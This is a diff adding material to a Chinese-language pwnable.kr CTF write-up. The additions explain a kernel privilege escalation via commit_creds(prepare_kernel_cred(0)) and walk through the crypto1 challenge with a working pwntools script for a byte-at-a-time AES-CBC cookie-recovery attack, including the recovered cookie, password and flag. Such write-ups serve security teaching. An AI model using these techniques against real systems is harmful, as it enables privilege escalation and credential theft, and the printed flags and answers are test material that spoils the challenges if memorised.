@@ -15609,9 +15609,9 @@ module_init( initmodule );
 module_exit( exitmodule );
 ```
 
-我们可以发现通过`sys_upper()`函数，未经授权的用户几乎能在任意地址写入任何字节，具体的利用思路如下：
+我们可以发现通过`sys_upper()`函数，未经授权的用户几乎能在任意地址写入任何字节的内容，具体的利用思路如下：
 
-1.准备系统调用例程`sys_getroot()`。
+1.准备系统调用例程`sys_getroot()`。该函数接受两个函数指针作为参数，这两个函数指针分别指向内核函数 `prepare_kernel_cred` 和 `commit_creds`。函数 `sys_getroot` 在调用 `lpfn_prepare_kernel_cred` 函数并将其返回值作为参数传递给 `lpfn_commit_creds` 函数，以获取 root 权限。
 
 ```c
 long sys_getroot(void* (*lpfn_prepare_kernel_cred)(void*), int (*lpfn_commit_creds)(void*)) {
@@ -15634,6 +15634,14 @@ syscall(SYS_upper, lpfn_prepare_kernel_cred, lpfn_commit_creds);
 ```
 
 启动一个`shell`来查看存储在`/root/flag`中的内容：`Congratz!! addr_limit looks quite IMPORTANT now... huh?`。
+
+Linux系统中每个进程拥有其对应的`struct cred`，用于记录该进程的`uid`。内核`exploit`的目的，便是修改当前进程的`cred`，从而提升权限以获取对系统的完全控制。当然，进程本身是无法篡改自己的`cred`，我们需要在内核空间中，通过以下方式来达到这一目的：
+
+```
+commit_creds(prepare_kernel_cred(0));
+```
+
+其中，`prepare_kernel_cred()`创建一个新的`cred`，如果参数为`0`则将`cred`中的`uid`, `gid`设置为`0`，即对应于root用户。随后，`commit_creds()`将这个`cred`应用于当前进程。此时，进程便提升到了`root`权限。这些方法的地址，可以通过`/proc/kallsyms`获取。总而言之，我们使用 `cat /proc/kallsyms | grep prepare_kernel_cred` 命令查找到 `prepare_kernel_cred` 函数的地址，并使用 `cat /proc/kallsyms | grep commit_creds` 命令查找到 `commit_creds` 函数的地址，然后将这两个地址作为参数传递给 `t0ur1st` 程序。
 
 ```bash
 / $ cd tmp
@@ -15703,4 +15711,276 @@ uid=0 gid=0
 /tmp # cat /root/flag
 Congratz!! addr_limit looks quite IMPORTANT now... huh?
 ```
+
+------
+
+### crypto1
+
+这是**Pwnable.kr**的第三十二个挑战`crypto1`，来自**[Rookiss]**部分。
+
+```bash
+We have isolated the authentication procedure to another box using RPC. 
+The credential information between RPC is encrypted with AES-CBC, so it will be secure enough from sniffing.
+I believe no one can login as admin but me :p
+
+Download : http://pwnable.kr/bin/client.py
+Download : http://pwnable.kr/bin/server.py
+
+
+Running at : nc pwnable.kr 9006
+```
+
+将`client.py`和`server.py`下载，并审计代码，我直接在代码旁边写注释来解释程序啦。简而言之，该程序建立了一个基本的 XML-RPC 服务器，使用 AES-128 加密（CBC 模式）提供了身份验证机制。客户端可以通过 XML-RPC 远程调用 "authenticate" 方法，传递一个包含 ID、密码和 cookie 的加密数据包。服务器解密数据包，执行身份验证检查，并返回身份验证结果。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/client.py
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/server.py
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ cat ./server.py
+#!/usr/bin/python
+import xmlrpclib, hashlib
+from SimpleXMLRPCServer import SimpleXMLRPCServer
+from Crypto.Cipher import AES
+import os, sys
+
+BLOCK_SIZE = 16   # AES加密的块大小
+PADDING = '\x00'  # AES加密的填充字符
+pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING  # 使用PADDING填充字符串s, 以确保其长度是BLOCK_SIZE的倍数
+EncodeAES = lambda c, s: c.encrypt(pad(s)).encode('hex')  # 接受AES密码c, 对消息s进行填充加密并返回16进制加密数据
+DecodeAES = lambda c, e: c.decrypt(e.decode('hex'))  # 接受AES密码c, 对消息e进行解密并返回解密数据
+
+# server's secrets
+key = 'erased. but there is something on the real source code'
+iv = 'erased. but there is something on the real source code'
+cookie = 'erased. but there is something on the real source code'
+# 使用密码块链接（CBC）模式执行AES-128解密, 接受消息msg,使用提供的key和初始化向量iv创建AES密码对象，解密消息并在返回解密数据之前删除填充字符
+def AES128_CBC(msg):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return DecodeAES(cipher, msg).rstrip(PADDING)
+# 用于对服务器接收到的数据包进行身份验证,
+def authenticate(e_packet):
+    packet = AES128_CBC(e_packet)  # 使用AES128_CBC函数对数据包进行解密并将其分割为三个部分: id, pw, cookie
+
+    id = packet.split('-')[0]
+    pw = packet.split('-')[1]
+    # 检查数据包的cookie是否与服务器的cookie匹配
+    if packet.split('-')[2] != cookie:
+        return 0        # request is not originated from expected server
+    # 计算id和cookie的组合的哈希, 并将其与提供的密码pw进行比较
+    if hashlib.sha256(id+cookie).hexdigest() == pw and id == 'guest':
+        return 1
+    if hashlib.sha256(id+cookie).hexdigest() == pw and id == 'admin':
+        return 2
+    return 0
+
+server = SimpleXMLRPCServer(("localhost", 9100))  # 创建一个绑定到本机地址和端口9100的XML-RPC协议服务器实例
+print "Listening on port 9100..."
+server.register_function(authenticate, "authenticate")  # 注册authenticate函数，以便通过XML-RPC远程调用
+server.serve_forever()  # 服务器无限期运行, 并打印一条消息表示服务器正在监听端口9100
+
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ cat ./client.py
+#!/usr/bin/python
+from Crypto.Cipher import AES
+import base64
+import os, sys
+import xmlrpclib
+rpc = xmlrpclib.ServerProxy("http://localhost:9100/")
+
+BLOCK_SIZE = 16   # AES加密的块大小
+PADDING = '\x00'  # AES加密的填充字符
+pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING  # 使用PADDING填充字符串s, 以确保其长度是BLOCK_SIZE的倍数
+EncodeAES = lambda c, s: c.encrypt(pad(s)).encode('hex')  # 接受AES密码c, 对消息s进行填充加密并返回16进制加密数据
+DecodeAES = lambda c, e: c.decrypt(e.decode('hex'))  # 接受AES密码c, 对消息e进行解密并返回解密数据
+
+# server's secrets
+key = 'erased. but there is something on the real source code'
+iv = 'erased. but there is something on the real source code'
+cookie = 'erased. but there is something on the real source code'
+
+# guest / 8b465d23cb778d3636bf6c4c5e30d031675fd95cec7afea497d36146783fd3a1
+# 该函数用于对输入进行验证, 遍历参数arg的每个字符, 如果其中有任何字符不属于允许的字符集合（包括小写字母、数字、短横线和下划线）则返回 False; 否则返回True
+def sanitize(arg):
+    for c in arg:
+        if c not in '1234567890abcdefghijklmnopqrstuvwxyz-_':
+            return False
+    return True
+# 使用密码块链接（CBC）模式执行AES-128解密, 接受消息msg,使用提供的key和初始化向量iv创建AES密码对象，解密消息并在返回解密数据之前删除填充字符
+def AES128_CBC(msg):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return EncodeAES(cipher, msg)
+# 该函数用于发送身份验证请求给服务器, 将参数id和pw与服务器的cookie组合成一个数据包, 使用AES128_CBC函数对数据包进行加密, 并将加密的数据包作为参数调用rpc.authenticate方法来向服务器发送请求, 最后返回服务器的响应结果
+def request_auth(id, pw):
+    packet = '{0}-{1}-{2}'.format(id, pw, cookie)
+    e_packet = AES128_CBC(packet)
+    print 'sending encrypted data ({0})'.format(e_packet)
+    sys.stdout.flush()
+    return rpc.authenticate(e_packet)
+
+if __name__ == '__main__':
+    print '---------------------------------------------------'
+    print '-       PWNABLE.KR secure RPC login system        -'
+    print '---------------------------------------------------'
+    print ''
+    print 'Input your ID'
+    sys.stdout.flush()
+    id = raw_input()
+    print 'Input your PW'
+    sys.stdout.flush()
+    pw = raw_input()
+	# 验证输入的id和pw是否符合要求, 如果不符合则打印错误消息并退出程序。
+    if sanitize(id) == False or sanitize(pw) == False:
+        print 'format error'
+        sys.stdout.flush()
+        os._exit(0)
+
+    cred = request_auth(id, pw)
+
+    if cred==0 :
+        print 'you are not authenticated user'
+        sys.stdout.flush()
+        os._exit(0)
+    if cred==1 :
+        print 'hi guest, login as admin'
+        sys.stdout.flush()
+        os._exit(0)
+
+    print 'hi admin, here is your flag'
+    print open('flag').read()
+    sys.stdout.flush()
+```
+
+我们需要管理员的密码来获取`flag`，即`hashlib.sha256(id+cookie).hexdigest()`。已知`id`是`admin`，只要求出`cookie`就能知道密码。程序使用`AES128_CBC`的加密模式，这种加密方式容易受到字节反转攻击，然而字节反转攻击需要响应中有解密出来的明文，在这里无法使用。由于`AES128_CBC`是对称加密方法，明文和密文的字节是一一对应的，并且这道题目中cookie的字符由小写字母、数字、短横线和下划线组成，因此它是可控的、可以爆破出来的。具体方法是：控制要加密的明文中`cookie`前面的字符数量，使要爆破的字节刚好位于分组中的最后一组的最后一个字节。接下来爆破方法是，每次改变最后一个字节，并把客户端返回的对应分组的加密密文与没有改变时的加密密文对比，当相等时说明该字节就是对应的`cookie`字节，如此爆破下去直到找到完整的`cookie`。
+
+计算出`cookie`是`you_will_never_guess_this_sugar_honey_salt_cookie`后，就很容易算出正确的`pw`。
+
+`pw = hashlib.sha256(id+cookie).hexdigest() = fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503`
+
+```python
+from pwn import *
+
+def getRealEPack(ID,PW):
+    io = remote('localhost',9006)
+    io.recvuntil(b'ID\n')
+    io.sendline(ID.encode())
+    io.recvuntil(b'PW\n')
+    io.sendline(PW.encode())
+    s = io.recvline().decode()
+    e_pack = s[s.find('(')+1:-2]
+    io.close()
+    return e_pack
+
+
+def getCookie(guess):
+    for i in range(2,100):
+        pack = '-'*(15-i%16)+'--'+guess
+        for j in '1234567890abcdefghijklmnopqrstuvwxyz-_!':
+            e_pack0 = getRealEPack(pack+j,'')
+            e_pack1 = getRealEPack('-'*(15-i%16),'')
+            if e_pack0[:len(pack+j)*2] == e_pack1[:len(pack+j)*2]:
+                guess += j
+                print(guess)
+                break
+            if j == '!':
+                return guess
+
+
+def getflag(cookie):
+    io = remote('localhost',9006)
+    id = 'admin'
+    io.sendlineafter(b'Input your ID\n', id)
+    pw = hashlib.sha256(id+cookie).hexdigest()
+    io.sendlineafter(b'Input your PW\n', pw)
+    log.success('ID: {}\nPW: {}'.format(id,term.text.bold_italic_yellow(pw)))
+    io.recvuntil(b'hi admin, here is your flag\n')
+    flag = io.recvline().decode().strip()
+    io.close()
+    return flag
+
+
+context.log_level = 'error'
+cookie = getCookie('')  # 'you_will_never_guess_this_sugar_honey_salt_cookie'
+context.log_level = 'info'
+log.success('Cookie: {}'.format(cookie))
+flag = getflag(cookie)
+log.success('Flag: {}'.format(term.text.bold_italic_yellow(flag)))
+```
+
+由于网络响应较慢，我们可以利用上一题的账号密码将本题的`exploit.py`上传到系统中，以更快地执行代码。
+
+```python
+from pwn import *
+
+shell = ssh(user='col', host='pwnable.kr', port=2222, password='guest')
+exploit = shell.upload_file("exploit.py", "/tmp/exp.py")
+# io = shell.process(["python", exploit], raw=False)
+```
+
+`SSH`进入系统运行`exploit.py`很丝滑地拿到`flag`：`byte to byte leaking against block cipher plaintext is fun!!`。
+
+```bash
+syscall@pwnable:~$ python /tmp/exp.py
+y
+yo
+you
+you_
+you_w
+you_wi
+you_wil
+you_will
+you_will_
+you_will_n
+you_will_ne
+you_will_nev
+you_will_neve
+you_will_never
+you_will_never_
+you_will_never_g
+you_will_never_gu
+you_will_never_gue
+you_will_never_gues
+you_will_never_guess
+you_will_never_guess_
+you_will_never_guess_t
+you_will_never_guess_th
+you_will_never_guess_thi
+you_will_never_guess_this
+you_will_never_guess_this_
+you_will_never_guess_this_s
+you_will_never_guess_this_su
+you_will_never_guess_this_sug
+you_will_never_guess_this_suga
+you_will_never_guess_this_sugar
+you_will_never_guess_this_sugar_
+you_will_never_guess_this_sugar_h
+you_will_never_guess_this_sugar_ho
+you_will_never_guess_this_sugar_hon
+you_will_never_guess_this_sugar_hone
+you_will_never_guess_this_sugar_honey
+you_will_never_guess_this_sugar_honey_
+you_will_never_guess_this_sugar_honey_s
+you_will_never_guess_this_sugar_honey_sa
+you_will_never_guess_this_sugar_honey_sal
+you_will_never_guess_this_sugar_honey_salt
+you_will_never_guess_this_sugar_honey_salt_
+you_will_never_guess_this_sugar_honey_salt_c
+you_will_never_guess_this_sugar_honey_salt_co
+you_will_never_guess_this_sugar_honey_salt_coo
+you_will_never_guess_this_sugar_honey_salt_cook
+you_will_never_guess_this_sugar_honey_salt_cooki
+you_will_never_guess_this_sugar_honey_salt_cookie
+[+] Cookie: you_will_never_guess_this_sugar_honey_salt_cookie
+[+] Opening connection to localhost on port 9006: Done
+[+] ID: admin
+    PW: fcf00f6fc7f66ffcfec02eaf69d30398b773fa9b2bc398f960784d60048cc503
+[*] Closed connection to localhost port 9006
+[+] Flag: byte to byte leaking against block cipher plaintext is fun!!
+```
+
+------
 
